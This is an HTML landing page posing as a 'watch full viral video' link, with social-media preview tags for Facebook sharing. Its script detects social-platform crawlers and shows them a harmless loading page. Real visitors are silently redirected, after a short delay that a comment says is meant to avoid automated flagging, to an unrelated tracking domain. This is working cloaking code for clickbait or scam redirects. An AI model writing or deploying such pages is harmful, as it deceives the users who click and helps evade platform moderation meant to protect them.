<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Title and Meta Description -->
    <title>Watch Full Video</title>
    <meta name="description" content="Click here to watch the full viral video stream.">

    <!-- Facebook Open Graph Tags (Preview Image and Card Fix) -->
    <meta property="og:title" content="Watch Full Video Stream">
    <meta property="og:description" content="Click here to watch the full viral video stream.">
    <meta property="og:type" content="article">
    <meta property="og:image" content="https://img.freepik.com/free-vector/play-button-concept-illustration_114360-1288.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">

    <!-- Fast Meta Refresh (Backup Fallback for non-JS Users) -->
    <noscript>
        <meta http-equiv="refresh" content="0; url=https://e.urlxx233.com/?utm_source=Raees&utm_medium=Endgame">
    </noscript>

    <script>
        (function() {
            // Target URL
            var targetURL = "https://e.urlxx233.com/?utm_source=Raees&utm_medium=Endgame";
            
            // Check User-Agent (Facebook Scraper Detection)
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            var isFacebookBot = /facebookexternalhit|Facebot|Twitterbot|LinkedInBot|WhatsApp/i.test(userAgent);

            // Agar Facebook Bot NAHI hai, tabhi real user ko redirect karo
            if (!isFacebookBot) {
                // 300ms Delay to avoid instant automated flag
                setTimeout(function() {
                    window.location.replace(targetURL);
                }, 300);
            }
        })();
    </script>
</head>
<body style="margin: 0; padding: 0; background-color: #f4f4f4; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh;">

    <!-- Normal Display for Loading State / Bots -->
    <div style="text-align: center; padding: 20px;">
        <h2 style="color: #333;">Loading video, please wait...</h2>
        <p style="color: #666;">If you are not redirected automatically, <a href="https://e.urlxx233.com/?utm_source=Raees&utm_medium=Endgame" style="color: #0066cc;">click here</a>.</p>
    </div>

</body>
</html>
